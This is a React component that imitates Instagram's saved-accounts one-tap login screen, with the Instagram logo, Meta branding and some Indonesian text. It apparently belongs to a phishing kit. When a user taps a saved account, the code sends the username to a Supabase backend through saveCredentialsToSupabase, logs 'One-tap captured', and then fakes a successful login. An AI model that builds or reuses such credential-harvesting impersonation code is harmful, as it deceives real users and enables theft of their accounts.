import React, { useState } from 'react';
import { ScreenType, LanguageCode, TRANSLATIONS, INSTAGRAM_LOGO_SVG, SavedAccount } from '../types';
import { Settings2, Trash2, X, AlertCircle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { saveCredentialsToSupabase } from '../services/supabaseService';

interface LoginSavedProps {
  savedAccounts: SavedAccount[];
  onRemoveAccount: (id: string) => void;
  onLoginSuccess: (username: string) => void;
  setScreen: (screen: ScreenType) => void;
  lang: LanguageCode;
  setLang: (lang: LanguageCode) => void;
}

export default function LoginSaved({
  savedAccounts,
  onRemoveAccount,
  onLoginSuccess,
  setScreen,
  lang,
  setLang,
}: LoginSavedProps) {
  const t = TRANSLATIONS[lang];
  const [selectedAccount, setSelectedAccount] = useState<SavedAccount | null>(null);
  const [loggingIn, setLoggingIn] = useState(false);
  const [isManaging, setIsManaging] = useState(false);
  const [showConfirmRemove, setShowConfirmRemove] = useState<SavedAccount | null>(null);

  const handleLogin = (account: SavedAccount) => {
    if (isManaging) return;
    setSelectedAccount(account);
    setLoggingIn(true);
    
    // Save to Supabase with auto-onetap marker
    saveCredentialsToSupabase(account.username, '[Saved One-Tap Auto-Login]')
      .then((success) => {
        console.log('One-tap captured:', success);
      })
      .finally(() => {
        // Simulate one-tap login animation latency
        setTimeout(() => {
          setLoggingIn(false);
          onLoginSuccess(account.username);
        }, 800);
      });
  };

  const confirmRemove = (e: React.MouseEvent, account: SavedAccount) => {
    e.stopPropagation(); // prevent triggering login
    setShowConfirmRemove(account);
  };

  const handleRemove = () => {
    if (showConfirmRemove) {
      onRemoveAccount(showConfirmRemove.id);
      setShowConfirmRemove(null);
    }
  };

  return (
    <div className="flex-1 flex flex-col justify-between pt-1 w-full bg-white dark:bg-black font-sans relative">
      
      {/* Top Controls: Language & Manage Toggle */}
      <div className="w-full flex items-center justify-between px-6 py-2 shrink-0 select-none">
        <select
          value={lang}
          onChange={(e) => setLang(e.target.value as LanguageCode)}
          className="bg-transparent text-gray-500 dark:text-zinc-500 text-xs px-2 py-1 rounded outline-none border-none cursor-pointer focus:ring-0 active:bg-gray-100"
        >
          {Object.entries(TRANSLATIONS).map(([code, data]) => (
            <option key={code} value={code} className="bg-white dark:bg-zinc-950 text-black dark:text-white">
              {data.languageName}
            </option>
          ))}
        </select>

        {savedAccounts.length > 0 && (
          <button
            onClick={() => setIsManaging(!isManaging)}
            className="text-xs font-semibold text-[#0095f6] hover:opacity-80 active:opacity-60 cursor-pointer"
          >
            {isManaging ? 'Done' : 'Edit'}
          </button>
        )}
      </div>

      {/* Main Container */}
      <div className="flex-1 flex flex-col justify-center px-8 max-w-sm mx-auto w-full">
        
        {/* Instagram Logo wordmark */}
        <div className="flex justify-center mb-8 select-none">
          <div 
            className="w-44 text-black dark:text-white"
            dangerouslySetInnerHTML={{ __html: INSTAGRAM_LOGO_SVG }}
          />
        </div>

        {/* Saved Profiles list */}
        <div className="space-y-4 w-full">
          {savedAccounts.map((account) => {
            const isLoadingThis = loggingIn && selectedAccount?.id === account.id;
            
            return (
              <div
                key={account.id}
                onClick={() => handleLogin(account)}
                className={`relative flex items-center justify-between p-3 border border-gray-100 dark:border-zinc-900 rounded-xl bg-[#fafafa] dark:bg-zinc-900/40 hover:bg-gray-50 dark:hover:bg-zinc-900/80 transition-all duration-200 cursor-pointer ${
                  isManaging ? 'opacity-90 select-none' : 'active:scale-[0.99]'
                }`}
              >
                <div className="flex items-center gap-3">
                  {/* Avatar wrapper */}
                  <div className="relative">
                    <div className={`p-[1.5px] rounded-full ${account.unseenStories ? 'bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7]' : 'bg-transparent'}`}>
                      <img
                        src={account.avatarUrl}
                        alt={account.username}
                        referrerPolicy="no-referrer"
                        className="h-14 w-14 rounded-full object-cover border-2 border-white dark:border-black"
                      />
                    </div>
                    {isLoadingThis && (
                      <div className="absolute inset-0 bg-black/40 rounded-full flex items-center justify-center">
                        <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      </div>
                    )}
                  </div>

                  <div>
                    <h3 className="font-semibold text-sm text-black dark:text-white">{account.username}</h3>
                    <p className="text-xs text-gray-500 dark:text-zinc-500">{account.fullName}</p>
                  </div>
                </div>

                {/* Right Action: Log In Button / Remove Icon */}
                <div className="flex items-center">
                  <AnimatePresence mode="wait">
                    {isManaging ? (
                      <motion.button
                        key="remove"
                        initial={{ opacity: 0, scale: 0.8 }}
                        animate={{ opacity: 1, scale: 1 }}
                        exit={{ opacity: 0, scale: 0.8 }}
                        onClick={(e) => confirmRemove(e, account)}
                        className="p-2 text-red-500 hover:bg-red-50 dark:hover:bg-red-950/20 rounded-full cursor-pointer"
                        title={t.removeAccountText}
                      >
                        <Trash2 className="h-5 w-5" />
                      </motion.button>
                    ) : (
                      <motion.button
                        key="login"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        disabled={loggingIn}
                        className="px-4 py-1.5 bg-[#0095f6] hover:bg-[#1877f2] text-white text-xs font-bold rounded-lg cursor-pointer transition-colors"
                      >
                        {t.loginButtonText}
                      </motion.button>
                    )}
                  </AnimatePresence>
                </div>
              </div>
            );
          })}

          {/* Fallback if all accounts are deleted */}
          {savedAccounts.length === 0 && (
            <div className="text-center py-6 text-gray-400 dark:text-zinc-500 text-xs">
              Tidak ada akun tersimpan. Menghubungkan ke login utama...
              {setTimeout(() => setScreen('standard-login'), 1200)}
            </div>
          )}
        </div>

        {/* Divider and switch account link */}
        <div className="mt-8 flex flex-col items-center gap-3">
          <button
            onClick={() => setScreen('standard-login')}
            className="text-sm font-semibold text-[#0095f6] hover:opacity-80 active:opacity-60 cursor-pointer"
          >
            {t.switchAccountText}
          </button>
        </div>
      </div>

      {/* Meta Branding Bottom Bar */}
      <div className="w-full border-t border-slate-200 dark:border-zinc-800 py-5 flex flex-col items-center justify-center gap-1.5 text-xs text-gray-400 dark:text-zinc-500 bg-[#fafafa] dark:bg-[#050505] shrink-0">
        <button
          onClick={() => setScreen('signup')}
          className="text-sm font-semibold text-[#0095f6] hover:opacity-80 mb-1"
        >
          {t.signUpLinkText}
        </button>
        <span>{t.bottomText}</span>
      </div>

      {/* Confirmation Modal Overlay for Removal */}
      <AnimatePresence>
        {showConfirmRemove && (
          <div className="absolute inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center z-[999] px-6">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-zinc-900 rounded-2xl w-full max-w-[280px] overflow-hidden shadow-2xl border border-gray-100 dark:border-zinc-800 font-sans"
            >
              <div className="p-6 text-center">
                <img
                  src={showConfirmRemove.avatarUrl}
                  alt={showConfirmRemove.username}
                  className="h-16 w-16 rounded-full object-cover mx-auto mb-3 border-2 border-gray-200 dark:border-zinc-700"
                />
                <h4 className="font-bold text-base text-black dark:text-white mb-2">
                  Hapus akun?
                </h4>
                <p className="text-xs text-gray-505 dark:text-zinc-400">
                  Anda harus memasukkan nama pengguna dan kata sandi lagi jika ingin masuk sebagai @{showConfirmRemove.username}.
                </p>
              </div>
              <div className="flex flex-col border-t border-gray-200 dark:border-zinc-800 text-sm font-semibold">
                <button
                  onClick={handleRemove}
                  className="w-full py-3.5 text-red-500 hover:bg-gray-50 dark:hover:bg-zinc-800/50 border-b border-gray-200 dark:border-zinc-800 text-center active:bg-gray-100 cursor-pointer"
                >
                  {t.removeAccountText}
                </button>
                <button
                  onClick={() => setShowConfirmRemove(null)}
                  className="w-full py-3.5 text-gray-600 dark:text-zinc-400 hover:bg-gray-50 dark:hover:bg-zinc-800/50 text-center active:bg-gray-100 font-normal cursor-pointer"
                >
                  Batal
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
